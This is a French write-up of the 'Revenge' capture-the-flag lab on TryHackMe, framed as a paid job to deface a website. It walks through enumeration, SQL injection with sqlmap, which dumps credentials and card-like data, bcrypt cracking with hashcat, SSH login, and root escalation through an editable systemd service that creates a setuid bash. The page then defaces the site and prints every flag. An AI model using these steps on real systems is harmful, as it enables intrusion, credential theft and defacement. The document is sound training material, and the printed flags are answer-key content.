# Revenge #

## Task 1 Message from Billy Joel ##

**Read through your mission and continue**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat qTyAhRp.txt 
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
```

On télécharge le fichier et on le lit.   

## Task 2 Revenge! ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c  "echo '10.10.93.141 revenge.thm' >> /etc/hosts" 
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A revenge.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 09:05 CEST
Nmap scan report for revenge.thm (10.10.93.141)
Host is up (0.040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/9%OT=22%CT=1%CU=41094%PV=Y%DS=2%DC=T%G=Y%TM=6139B264
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.56 ms 10.9.0.1
2   35.64 ms revenge.thm (10.10.93.141)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.34 seconds
```

D'arpès le scan nmap il y a 2 service :    
Le service SSH sur le port 22.    
Le service HTTP sur le port 80.    

![page1](./Task1-01.png)    

Sur la page principale il y a rien d'intéressant.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://revenge.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,jpg -q
/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/admin                (Status: 200) [Size: 4983]
/static               (Status: 301) [Size: 194] [--> http://revenge.thm/static/]
/requirements.txt     (Status: 200) [Size: 258]                      
```

On voit un fichier requirements.txt

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://revenge.thm/requirements.txt
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

Dans le fichier requirements.txt on voit un parser de python pycparser recherchons des fichiers python.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://revenge.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x py -q
/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/admin                (Status: 200) [Size: 4983]
/static               (Status: 301) [Size: 194] [--> http://revenge.thm/static/]
/app.py               (Status: 200) [Size: 2371]                          
```

On trouve une application en python qui est app.py.   

```python
tim@kali:~/Bureau/tryhackme/write-up$ curl http://revenge.thm/app.py
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')


# Main Index Route
@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', title='Home')


# Contact Route
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        flash('Thank you for reaching out.  Someone will be in touch shortly.')
        return render_template('contact.html', title='Contact')

    elif request.method == 'GET':
        return render_template('contact.html', title='Contact')


# Products Route
@app.route('/products', methods=['GET'])
def products():
    return render_template('products.html', title='Our Products')


# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)


# Login
@app.route('/login', methods=['GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html', title='Customer Login')


# Admin login
@app.route('/admin', methods=['GET'])
def admin():
    if request.method == 'GET':
        return render_template('admin.html', title='Admin Login')


# Page Not found error handler
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html', error=e), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html', error=e), 500


if __name__ == "__main__":
    app.run('0.0.0.0')

```

On que l'application se connecte sur une basse de donnée sql.  

```python
@app.route('/products/<product_id>', methods=['GET'])
```

Dans le code la requete SQL se fait à partir de products.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sqlmap -u http://10.10.137.57/products/1 --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
...
available databases [5]:                                                                                                                                                                                                                     
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
...
```

On trouve plusieurs base de données, duckyinc est la base où sont stockés les produits du site.  

**flag1**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sqlmap -u http://revenge.thm/products/1 -D duckyinc --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:38:26 /2021-09-09/

[10:38:26] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 
[10:38:27] [INFO] resuming back-end DBMS 'mysql' 
[10:38:27] [INFO] testing connection to the target URL
[10:38:27] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
...
Database: duckyinc                                                                                                                   
...
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

...
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
...
```

On dump les données.  
On trouve le premier flag qui est : thm{br3ak1ng_4nd_3nt3r1ng} 

On trouve un hash de sadmin qui est l'administrateur du serveur.
Le hash est  $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hashcat -h | grep '$2.'
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System

tim@kali:~/Bureau/tryhackme/write-up$ echo '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a' > hash

tim@kali:~/Bureau/tryhackme/write-up$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --quiet
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:inuyasha
```

On casse le hash de server-admin et on le trouve.  
Le mot de passe est : inuyasha   

**flag2**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh server-admin@revenge.thm
The authenticity of host 'revenge.thm (10.10.93.141)' can't be established.
ECDSA key fingerprint is SHA256:p6l0aKeIJlyHmiqZxt/pRvjb++LAjF9jTDp4ZkSCpOk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'revenge.thm,10.10.93.141' (ECDSA) to the list of known hosts.
server-admin@revenge.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.


################################################################################
#			 Ducky Inc. Web Server 00080012			       #
#	     This server is for authorized Ducky Inc. employees only	       #
#		   All actiions are being monitored and recorded	       #
#		     IP and MAC addresses have been logged		       #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$ ls
flag2.txt
server-admin@duckyinc:~$ cat flag2.txt
thm{4lm0st_th3re}
```

On se connecte sur le compte server-admin.   
On trouve un fichier flag2.txt.  
On le lit et on trouve le deuxième flag qui est : thm{4lm0st_th3re} 

**flag3**

```bash
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

On voit que l'on peut exécuter le service duckinc avec les droits root.   
On peut éditer le fichier duckyinc.service avec sudoedit.   

```bash
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
  GNU nano 2.9.3                                                                                         /var/tmp/duckyincXXNn0Q6p.service                                                                                                    

[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/shell.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

On modifie le fichier pour qu'il exécute notre script avec les droits root.   

```bash
server-admin@duckyinc:~$ echo "cp /bin/bash /tmp/sh" > /tmp/shell.sh
server-admin@duckyinc:~$ echo "chmod +s /tmp/sh" >> /tmp/shell.sh
server-admin@duckyinc:~$ chmod +x /tmp/shell.sh 
```

On copie un bash dans tmp et on lui met setuid.   

```bash
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload 
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
```

On recharge le service pour avoir notre sh avc le setuid dans tmp.   

```bash
server-admin@duckyinc:~$ /tmp/sh -p
sh-4.4# id
uid=1001(server-admin) gid=1001(server-admin) euid=0(root) egid=0(root) groups=0(root),33(www-data),1001(server-admin)

```

On lance le sh modifié en mode persitant et on a un shell les droits root.   

Sur le site on dit de modifier le site.  

```bash
sh-4.4# echo "pwned" > /var/www/duckyinc/templates/index.html 
sh-4.4# ls /root/
flag3.txt
sh-4.4# cat /root/flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}
```

On modifie le site, le fichier flag3.txt apparait.  
On le lit et on trouve notre flag.  

Réponse : thm{m1ss10n_acc0mpl1sh3d}    